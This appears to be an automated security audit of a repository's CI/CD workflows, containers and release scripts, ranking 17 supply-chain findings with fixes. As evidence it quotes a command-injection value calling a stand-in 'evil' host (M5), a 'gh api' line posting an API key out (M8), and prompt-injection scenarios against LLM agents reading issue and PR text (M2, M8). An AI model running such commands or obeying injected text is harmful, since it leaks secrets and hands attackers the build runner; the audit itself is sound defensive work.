---
persona: sec-devsecops
skill: sec-test:pipeline-harden
date: 2026-08-23
scope: CI/CD pipeline supply-chain & hardening audit (.github/workflows/, .github/actions/, .husky/, Dockerfiles, publish scripts)
standards: NIST SSDF (SP 800-218), SLSA v1.1 Build Track, GitHub Actions hardening checklist, OIDC/Sigstore
branch_audited: dev
---

# Pipeline Hardening Audit — D:\COdo

**Date:** 2026-08-23 · **Auditor:** sec-devsecops · **Default branch:** `dev`

## Scope & Method

All 26 workflows in `.github/workflows/` were read in full, plus both composite actions
(`setup-bun`, `setup-git-committer`), the `.husky/pre-push` hook, all 8 Dockerfiles reachable
from `containers.yml` / deploy paths (`base`, `bun-node`, `rust`, `tauri-linux`, `publish`,
root `Dockerfile`, `packages/codo/Dockerfile`, `packages/stats/server/Dockerfile`), and the
publish scripts they invoke (`script/publish.ts`, `packages/*/script/publish.ts`,
`packages/containers/script/build.ts`). Every finding below cites file:line evidence.

Trigger inventory: no `workflow_run` anywhere; two `pull_request_target` (pr-management.yml,
pr-standards.yml); two `issue_comment` (opencode.yml, review.yml); rest are push/tag/schedule/
dispatch. All **77 `uses:` directives across all workflows and composite actions are SHA-pinned**
with version comments — a strong baseline most repos fail.

## Findings Summary

| # | ID | Severity | Finding | Location |
|---|----|----------|---------|----------|
| H1 | fin_02f47f19a001oIxxZhRd2PmqJw | high | Unpinned `curl \| bash` installer in six secret-bearing workflows | triage.yml:23 +5 more |
| M2 | fin_02f47f1a20016S7hL35RDxU7eL | medium | triage agent consumes untrusted issue text with secrets in env, no explicit tool deny | triage.yml:25-37 |
| M3 | fin_02f47f1a5001PEPNij2iTDT6nj | medium | Comment-triggered agent job granted `id-token: write` + API key | opencode.yml:17-31 |
| M4 | fin_02f47f1a9001akFkOpkqO86wcJ | medium | npm provenance explicitly disabled on primary release path | publish.yml:517 |
| M5 | fin_02f47f1aa001JTYG76eLsPr3EL | medium | workflow_dispatch string input interpolated into bash | close-prs.yml:37 |
| M6 | fin_02f47f1ab001ZsC6pCCfVIrVAR | medium | Container build/published images: floating bases, checksum-less curl installs, root server image | multiple Dockerfiles |
| M7 | fin_02f47f1ac001U7L26M3t5ChKoL | medium | Windows signing/verification paths reference `packages\opencode\dist` but artifacts land in `packages/codo/dist`; verify loops fail-open when empty | publish.yml:155-218 |
| M8 | fin_02f47f1ad001Z7FXDcb5PR8Eu7 | medium | review agent allowlist `gh*` permits arbitrary API calls on attacker-influenced PR content | review.yml:50 |
| M9 | fin_02f47f1af001bz3gSmCklf6Fro | medium | Scheduled LLM commit job holds unnecessary `id-token: write`; stale upstream guard | docs-update.yml:13-18 |
| L10 | fin_02f47f1b0001TjdXds5LLuY3JJ | low | No `permissions:` block at all in three workflows | typecheck.yml, storybook.yml, notify-discord.yml |
| L11 | fin_02f47f1b1001vHWowEVoYAphIQ | low | `${{ github.event.pull_request.user.login }}` template-injected into bash | pr-management.yml:22 |
| L12 | fin_02f47f1b2001JcsdsDdqff4meW | low | Auto-push to `dev` with `--no-verify` bypasses hooks/review | generate.yml:39 |
| L13 | fin_02f47f1b4001XjdrtLpAFE7jn9 | low | AUR host-key TOFU: `ssh-keyscan ... \|\| true` | publish.yml:495 |
| L14 | fin_02f47f1b8001uRJ5u6DiPZtFkC | low | Bun binary downloaded without checksum; pip step fails open | setup-bun/action.yml:22-47 |
| L15 | fin_02f47f1bb001wUEXdQ5LFkIbPZ | low | Missing repository guard on release workflow; guard drift across fork | release-github-action.yml |
| L16 | fin_02f47f1bd001iaumstXhzZSSMQ | low | SSDF RV/PO gaps: no SECURITY.md, dependabot, or CI secret/dependency scanning | repo root |
| L17 | fin_02f47f1c0001l0eAZEE6aOjVr0 | low | Legacy actions/checkout v3.6.0 pinned on release-critical workflows | publish.yml:39 et al. |

**Tally:** 0 critical · 1 high · 8 medium · 8 low = **17 findings**

Ranked per dispatch instruction: untrusted-input-with-secrets first, missing pins on
docs-only workflows last.

---

## Detailed Findings

### H1 — Unpinned remote-code install (`curl … | bash`) in six privileged workflows

- **Category:** SLSA-L2 / NIST-SSDF-PS.1 · **Confidence:** high · **Severity:** high
- **Locations & evidence:**
  - `.github/workflows/triage.yml:23` — `run: curl -fsSL https://opencode.ai/install | bash`
  - `.github/workflows/pr-management.yml:40` — same pattern
  - `.github/workflows/duplicate-issues.yml:23` and `:135` — same pattern
  - `.github/workflows/review.yml:35` — same pattern
  - `.github/workflows/docs-locale-sync.yml:53` — same pattern (job currently `if: false`)
- **Finding:** The opencode CLI is installed by piping a remote shell script straight into bash.
  There is no version pin, no checksum, and no signature check. Every one of these jobs holds
  secrets at execution time (`OPENCODE_API_KEY`, `GITHUB_TOKEN`, and in review.yml
  pull-request write). A compromise of `opencode.ai`, its CDN, or DNS resolves directly into
  arbitrary code execution inside secret-bearing runners — including jobs that are triggerable
  from public events (issue creation, PR open).
- **Why this ranks #1:** it is the single point of failure that converts any infrastructure
  compromise of the install endpoint into runner RCE with secrets, across the highest-frequency
  workflows in the repo.
- **Remediation:** Pin a released binary: download a specific version tarball, verify its
  published SHA-256 before executing, cache it via `actions/cache`. Alternatively use
  `bun i -g opencode-ai@<pinned-version>` with `bun.lock`-style integrity (as beta.yml:31 and
  publish.yml:54 already do — note those resolve `latest` implicitly; pin them too).

### M2 — triage agent: untrusted issue content + secrets in env, no explicit tool deny

- **Category:** ASI01 / NIST-SSDF-PW · **Confidence:** high · **Severity:** medium
- **Location:** `.github/workflows/triage.yml:25-37`
- **Evidence:**
  ```yaml
  env:
    OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}
    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
    ISSUE_TITLE: ${{ github.event.issue.title }}
    ISSUE_BODY: ${{ github.event.issue.body }}
  run: |
    opencode run --agent triage "The following issue was just opened, triage it:
    ...
    $ISSUE_BODY"
  ```
- **Finding:** Any GitHub user can open an issue whose title/body is fed verbatim into an LLM
  agent running with `OPENCODE_API_KEY` and an `issues:write` GITHUB_TOKEN in its environment.
  Unlike every sibling agent workflow — `opencode.yml:32` sets `OPENCODE_PERMISSION:
  '{"bash": "deny"}'`, `duplicate-issues.yml:29-36` sets granular deny with `webfetch: deny`,
  `review.yml:50` restricts to `gh*` — **triage.yml sets no permission config at all**, so the
  agent inherits the default ruleset (`"*": "ask"`, per `packages/codo/test/permission/next.test.ts:264`).
  In headless `opencode run` mode an unanswered `ask` stalls the tool call rather than cleanly
  denying, so today this fails closed-ish (hang/timeout) — but any future change to defaults,
  a repo-level opencode config file, or an agent definition granting `allow` silently converts
  public issue text into shell execution with secrets present. Note also the `triage` agent
  referenced does not exist in-repo (no `.opencode/` directory found) — fork/config drift.
- **Remediation:** Add `OPENCODE_PERMISSION: '{"bash": "deny", "edit": "deny", "webfetch": "deny"}'`
  matching duplicate-issues.yml, drop `GITHUB_TOKEN` to the minimum (it only needs issues read
  for analysis if commenting is done out-of-band), and commit the `triage` agent definition.

### M3 — Publicly-triggerable agent job granted `id-token: write` and API key

- **Category:** NIST-SSDF-PS.1 / least privilege · **Confidence:** high · **Severity:** medium
- **Location:** `.github/workflows/opencode.yml:17-19, 24-33`
- **Evidence:**
  ```yaml
  permissions:
    id-token: write        # why does a chat-reply agent need OIDC?
    contents: read
    ...
  - name: Run opencode
    uses: anomalyco/opencode/github@2c14fc5586fe0b88e5c04732d2e846769cc35671 # latest
    env:
      OPENCODE_API_KEY: ${{ secrets.OPENCODE_API_KEY }}
  ```
- **Finding:** Trigger is `issue_comment: created` / `pull_request_review_comment: created` with
  a `/oc` prefix — i.e., anyone who can comment can start a job holding an OIDC signing identity
  and the org's opencode API key. Checkout correctly uses the base ref (not attacker-controlled
  code) and bash is denied, so direct RCE is mitigated; the residual risk is OIDC federation
  abuse (if any cloud trust policy grants this repo's subject broadly, e.g. by repo rather than
  workflow) and API-key exposure through any future tool-surface expansion. The `# latest`
  comment on a SHA-pinned action is also misleading (the pin makes it deterministic; the comment
  should not claim otherwise — comments here are data, not truth).
- **Remediation:** Remove `id-token: write` unless the action mints tokens (verify against the
  pinned action source); keep deny-permissions; consider gating `/oc` to OWNER/MEMBER like
  review.yml:12 does.

### M4 — npm provenance explicitly disabled on the primary release path

- **Category:** SLSA-L2 / NIST-SSDF-PS.2 · **Confidence:** high · **Severity:** medium
- **Location:** `.github/workflows/publish.yml:517`
- **Evidence:**
  ```yaml
  - run: ./script/publish.ts
    env:
      ...
      NPM_CONFIG_PROVENANCE: false
  ```
  which flows into `packages/codo/script/publish.ts:23` → `` npm publish *.tgz --access public ``
- **Finding:** The workflow already carries `id-token: write` (publish.yml:30) — the exact
  prerequisite for npm provenance — yet provenance is force-disabled, and none of the four
  `npm publish` calls (codo, cli, sdk/js, plugin) pass `--provenance`. Every npm artifact of
  every release ships with zero build provenance, making consumer-side verification impossible
  and capping the pipeline at SLSA Build L1 despite hosted-build capability for L2 being one
  flag away. This is an explicit integrity downgrade, not an omission.
- **Remediation:** Delete `NPM_CONFIG_PROVENANCE: false` and add `--provenance` to all four
  publish commands. Confirm the registry publishes provenance on the next snapshot release.

### M5 — workflow_dispatch string input interpolated into `run:` (command-injection pattern)

- **Category:** CWE-78 / Actions-hardening · **Confidence:** high · **Severity:** medium
- **Location:** `.github/workflows/close-prs.yml:37`
- **Evidence:**
  ```yaml
  run: |
    max_close="${{ inputs['max-close'] }}"     # freeform string input → shell
  ```
- **Finding:** The `max-close` dispatch input (type: string) is templated directly into a bash
  script; a value containing `" ; curl evil | sh #"` would execute. Exploitation requires
  workflow_dispatch rights (write access), so this is privilege-adjacent rather than
  externally exploitable today — but rulesets/environments can grant dispatch without
  workflow-edit, and the checklist treats `${{ }}`-into-`run:` as forbidden regardless.
  (`inputs['dry-run']` at line 46 is type:boolean and safe.)
- **Remediation:** Pass via `env:` and expand as `"$MAX_CLOSE"`, exactly the safe pattern this
  same file already uses for GITHUB_TOKEN.

### M6 — Container images: floating/unpinned bases, checksum-less installs, root runtime

- **Category:** NIST-SSDF-PW.4 / container hardening · **Confidence:** high · **Severity:** medium
- **Locations & evidence:**
  - `packages/codo/Dockerfile:1` — `FROM alpine` (floating tag on the *published* CLI image)
  - `packages/containers/base/Dockerfile:1` — `FROM ubuntu:24.04` (mutable tag, not digest)
  - `packages/containers/bun-node/Dockerfile:16-21` — Node tarball and `curl bun.sh/install | bash`
    installed with no SHA verification
  - `packages/containers/rust/Dockerfile:4,11` — `RUST_TOOLCHAIN=stable` floating toolchain via
    `curl sh.rustup.rs | sh`
  - `Dockerfile:1` — `FROM oven/bun:1.3.13-debian` (tag-pinned but not digest; also version-skewed
    vs `BUN_VERSION=1.3.14` in bun-node)
  - `packages/stats/server/Dockerfile:23-32` — production runner stage has no `USER`, no
    `HEALTHCHECK` (runs as root, EXPOSE 3000)
- **Finding:** The chain built and pushed by containers.yml (`ghcr.io/<owner>/build/*:24.04`) and
  the published CLI image float on mutable tags and unverified downloads; rust builds are not
  reproducible (`stable`). Digest-pinning and checksummed fetches are the standard control set;
  the stats-server image additionally violates runtime hardening basics.
- **Remediation:** Pin `FROM ...@sha256:<digest>` for all bases (automation: renovate digest
  updates); verify Node/bun tarball SHAs inside the Dockerfile; pin rust to a specific minor
  channel; add `USER node`/non-root + `HEALTHCHECK` to the stats server stage.

### M7 — Windows signing/verification may target wrong paths and fails open when empty

- **Category:** NIST-SSDF-PW.4 / release integrity · **Confidence:** medium · **Severity:** medium
- **Locations & evidence:**
  - `publish.yml:160-163` signs `${{ github.workspace }}\packages\opencode\dist\opencode-windows-*\bin\opencode.exe`
  - `publish.yml:136-139` downloads the windows artifact into `packages/codo/dist`
  - `publish.yml:216-218` uploads signed artifacts from `packages/codo/dist/opencode-windows-*`
  - `publish.yml:384-387` verification collects files via `Get-ChildItem "...dist\*.exe"` with no
    existence assertion; empty result → loop body never runs → step exits 0
- **Finding:** The sign step lists `packages\opencode\dist\...exe` while everything else in this
  renamed repo lives under `packages/codo/dist`. Either the signing action errors on missing
  files (pipeline breakage) or — worse — the path resolves nothing and the subsequent
  Authenticode verification iterates an empty list and passes vacuously: signature theater.
  A release-integrity gate must fail closed when it verifies zero files.
- **Remediation:** Reconcile to one canonical path; add `if (!(Test-Path $file)) { throw }` and
  `if ($files.Count -eq 0) { throw "No files verified" }` to both verify steps
  (sign-cli-windows:175-189 and build-electron:380-394).

### M8 — review agent allowed `gh*`: broad API surface steered by attacker-influenced PR content

- **Category:** ASI01 / least privilege · **Confidence:** medium · **Severity:** medium
- **Location:** `.github/workflows/review.yml:50`
- **Evidence:** `OPENCODE_PERMISSION: '{ "bash": { "*": "deny", "gh*": "allow", "gh pr review*": "deny" } }'`
- **Finding:** `/review` is maintainer-gated (OWNER/MEMBER, line 12 — good), but the agent then
  reads the full attacker-authored diff/title/body and may execute any command beginning `gh`.
  Prefix-matching means even `gh api --method POST ... -f body=$OPENCODE_API_KEY` satisfies the
  allowlist, giving a prompt-injection payload both an action primitive (post arbitrary review
  comments within token scope) and a candidate secret-exfiltration channel via env expansion.
  The prompt itself instructs the agent to construct `gh api` calls (lines 73-81).
- **Remediation:** Replace `gh*` with the narrowest patterns actually needed (e.g. `gh api repos/*/*/pulls/*/comments*`), forbid `-f body=$` style expansions, and keep `webfetch: deny`.

### M9 — docs-update LLM job holds `id-token: write`; stale upstream guard disables it here

- **Category:** least privilege / config drift · **Confidence:** high · **Severity:** medium
- **Location:** `.github/workflows/docs-update.yml:13,15-18,46`
- **Evidence:** `if: github.repository == 'sst/opencode'` combined with `permissions: id-token: write, contents: write, pull-requests: write`
- **Finding:** A scheduled agent that edits markdown and opens PRs needs contents/pull-requests
  write — not OIDC token minting. Additionally the guard pins the upstream org (`sst/opencode`),
  so in this repository the workflow is dead config that will never fire; if someone "fixes" the
  guard during fork maintenance, the over-privileged version activates as-is. This is part of a
  broader drift: guards reference three different orgs (`sst/opencode` here, `anomalyco/opencode`
  in deploy.yml:18/stats.yml:12, `Mosalah4351/COdo` in publish.yml:37).
- **Remediation:** Drop `id-token: write`; align the guard with the actual repo slug in one sweep.

### L10 — Three workflows have no `permissions:` block anywhere

- **Category:** Actions-hardening / token scope · **Confidence:** high · **Severity:** low
- **Locations:** `typecheck.yml` (none in file), `storybook.yml:26-30`, `notify-discord.yml:7-14`
  (this one also handles `secrets.DISCORD_WEBHOOK`)
- **Finding:** These inherit the repo-default GITHUB_TOKEN permissions. Everything else in the
  repo declares explicit scopes; these three are the outliers. Impact bounded: none need write
  access.
- **Remediation:** Add top-level `permissions: {}` plus job-level `contents: read` (notify-discord needs nothing).

### L11 — `user.login` template-injected into bash

- **Category:** CWE-78 · **Confidence:** high · **Severity:** low
- **Location:** `.github/workflows/pr-management.yml:22`
- **Evidence:** `LOGIN="${{ github.event.pull_request.user.login }}"`
- **Finding:** Direct interpolation of an event field into `run:`. GitHub login charset
  (`[A-Za-z0-9-]`, max 39 chars) currently blocks metacharacters, so exploitation depends on an
  external invariant GitHub could relax. Same class as M5; lower severity only because the
  injected value's alphabet is platform-constrained.
- **Remediation:** `env: LOGIN: ${{ github.event.pull_request.user.login }}` then `"$LOGIN"`.

### L12 — Auto-push to default branch with `--no-verify`

- **Category:** NIST-SSDF-PS.1 / change control · **Confidence:** high · **severity:** low
- **Location:** `.github/workflows/generate.yml:37-39`
- **Evidence:** `git commit -m "chore: generate" --allow-empty && git push origin HEAD:${{ github.ref_name }} --no-verify`
- **Finding:** Generated code lands directly on `dev` via App token, bypassing pre-push hooks
  (`.husky/pre-push` runs `bun typecheck`) and PR review. If generation ever emits broken or
  malicious output (e.g., poisoned dependency README templates), it ships without a human gate.
  Job-level permissions are otherwise scoped correctly.
- **Remediation:** Open a PR instead of pushing (pull-requests: write is already granted);
  drop `--no-verify`.

### L13 — AUR SSH host key accepted blindly

- **Category:** NIST-SSDF-PS.1 · **Confidence:** high · **Severity:** low
- **Location:** `.github/workflows/publish.yml:495`
- **Evidence:** `ssh-keyscan -H aur.archlinux.org >> ~/.ssh/known_hosts || true`
- **Finding:** TOFU at release time: whatever host key DNS returns during the publish job is
  trusted, while the long-lived `AUR_KEY` private key authenticates. A MITM on the runner egress
  could capture the key material during handshake.
- **Remediation:** Commit the real aur.archlinux.org host key into the repo (or a variable) and
  append that instead of keyscanning.

### L14 — setup-bun composite: binary fetched without checksum; pip step fails open

- **Category:** supply chain · **Confidence:** high · **Severity:** low
- **Location:** `.github/actions/setup-bun/action.yml:22-29,45-47`
- **Evidence:** custom `bun-download-url` pointing at
  `https://github.com/oven-sh/bun/releases/download/bun-v${V}/...` passed to oven-sh/setup-bun;
  later `python3 -m pip install setuptools || pip install setuptools || true`
- **Finding:** The custom download URL bypasses any bundled integrity checking the action might
  do for its own managed versions; a Bun release compromise propagates to every workflow in this
  repo (all of them use this composite). The trailing `|| true` masks pip failures silently.
  Action itself is properly SHA-pinned.
- **Remediation:** Record expected SHAs per Bun version (map in composite inputs) and verify
  after install; remove `|| true` or log loudly on fallback.

### L15 — Release workflow lacks the repository guard its siblings have

- **Category:** defense-in-depth · **Confidence:** high · **Severity:** low
- **Location:** `.github/workflows/release-github-action.yml:15-29` (absent `if:`), compare `publish.yml:74`, `deploy.yml:18`
- **Finding:** The `release` job pushes tags/releases with `contents: write` and has **no**
  `if: github.repository == '...'` guard, unlike most other release-path jobs. Harmless in the
  origin repo (forks lack secrets), but it is the one release job that would run anywhere the
  workflow file is copied, and the inconsistent guard trio (see M9) shows the drift is already
  causing dead/alive confusion.
- **Remediation:** Normalize one canonical guard expression across all release-affecting workflows.

### L16 — SSDF Respond/Prepare gaps: no SECURITY.md, dependabot, or CI-level secret/deps scanning

- **Category:** NIST-SSDF-RV.1 / PO.3 · **Confidence:** high · **Severity:** low
- **Locations:** repo root (SECURITY.md absent), `.github/workflows/` (no dependabot.yml,
  no gitleaks/trivy/osv-scanner workflow; only a local `.gitleaksignore` exists, implying
  secret scanning happens off-CI)
- **Finding:** No disclosure contact, no automated dependency-update PRs, no CI enforcement of
  secret or dependency scanning. Positive counterweight: CODEOWNERS exists and nix-hashes.yml
  demonstrates reproducibility intent.
- **Remediation:** Add SECURITY.md with a contact; enable Dependabot (or renovate); add a
  gitleaks + osv-scanner workflow on PR/push (both tools available in this environment).

### L17 — Legacy actions/checkout v3.6.0 on the most sensitive workflows

- **Category:** hygiene / deprecated runtime · **Confidence:** high · **Severity:** low
- **Locations:** `publish.yml:39,76,134,260,416`, `deploy.yml:22`, `publish-vscode.yml:18`,
  `publish-github-action.yml:19` (all `f43a0e5f… # v3.6.0`) vs v4.3.1/v6.0.2 elsewhere
- **Finding:** checkout v3 targets the deprecated node16 runtime and predates v4+ fixes; it is
  pinned on exactly the workflows that publish to npm/GHCR and deploy to AWS. Not directly
  exploitable (SHA-pinned), but outdated majors on critical paths accumulate risk.
- **Remediation:** Bump to the v6.0.2 SHA already used by nix-eval.yml:23.

---

## SSDF (SP 800-218) Practice-Group Walk

| Group | Status | Evidence |
|-------|--------|----------|
| **PO** Prepare the Organization | partial | Toolchain pinned via `packageManager` + husky version check ✓, CODEOWNERS ✓; no security requirements doc, no SECURITY.md ✗ (L16) |
| **PS** Protect the Software | mostly pass | Secrets only via GH Secrets/App tokens ✓; AWS via OIDC federation, no static keys (deploy.yml:30-34) ✓; all actions SHA-pinned 77/77 ✓; gaps: curl-pipe-bash installs (H1), AUR TOFU (L13), long-lived PATs inherent to VSCE/OpenVSX ecosystems |
| **PW** Produce Well-Secured Software | partial | typecheck+unit+e2e gates (test.yml) ✓; Windows Authenticode + macOS notarization + tauri minisign with post-sign verify steps ✓ (but see M7 fail-open); reproducible node_modules hashing groundwork (nix-hashes.yml) ✓; no SAST/secret-scan in CI ✗ (L16); provenance disabled (M4) ✗; container bases unpinned (M6) ✗ |
| **RV** Respond to Vulnerabilities | weak | Automated issue triage exists ironically (triage.yml) but no disclosure policy, SLA, or scanning feed → L16 |

## SLSA v1.1 Build Track Assessment

**Current effective level: L1.** Builds are documented and executed on a hosted service
(GitHub Actions via Blacksmith runners), but no artifact carries consumable provenance:
npm provenance is explicitly switched off (M4), binaries get no attestation, GHCR images are
unsigned, no SBOM is produced or attached.

**Roadmap to L2 (smallest set of changes):**
1. Delete `NPM_CONFIG_PROVENANCE: false`; add `--provenance` to the four `npm publish` sites (M4).
2. Add `actions/attest-build-provenance` for the CLI/desktop artifacts in publish.yml.
3. Generate SBOMs (`syft packages -o cyclonedx-json`) for the published CLI image and attach to releases.
4. Keyless-sign GHCR images with `cosign sign --yes` (OIDC is already wired for deploy.yml).

**Roadmap to L3:** digest-pin all base images (M6); hermetic, checksum-verified toolchains
(L14, bun-node/rust Dockerfiles); move release jobs from shared third-party runners to isolated
ephemeral builders (Blacksmith's shared pool is not isolation-equivalent to hardened builders);
the nix-hashes work provides the reproducible-build substrate L3 reviewers look for.

**Sigstore status:** absent. Nothing is Sigstore-signed today; desktop update signing
(Authenticode/notary/minisign) exists and *is* verified client-side, which is genuine — unlike
the M7 vacuous verification, which is the kind of theater the skill warns about.

## Scanner Coverage

- **Ran:** static audit only (config/Dockerfile/script review). `rg`-based inventory of all
  `uses:` directives and trigger types.
- **Not run:** `syft`, `grype`, `trivy`, `osv-scanner`, `cosign` — there is no built image or
  release artifact in this workspace to scan, and building one exceeds this audit's read-only
  remit. Provenance/signature verification of published artifacts was therefore impossible and
  is deferred to the sbom / container-scan / supply-chain-attest personas against a real build.

## Positive Controls Worth Keeping

- 77/77 SHA-pinned actions, including third-party ones (SethCohen/github-releases-to-discord,
  apple-actions/import-codesign-certs, azure/login, aws-actions/configure-aws-credentials).
- AWS deploy via short-lived OIDC role assumption, environment-scoped (`environment: ${{ github.ref_name }}`).
- Both `pull_request_target` workflows avoid executing untrusted head-ref code
  (pr-management checks out the base; pr-standards performs no checkout at all).
- Agent sandboxing intent is present in most agent workflows (explicit deny lists).
- Token hygiene comment in setup-git-committer (extraheader vs remote URL) matches practice.
- Concurrency groups on every release path prevent parallel-publish races.
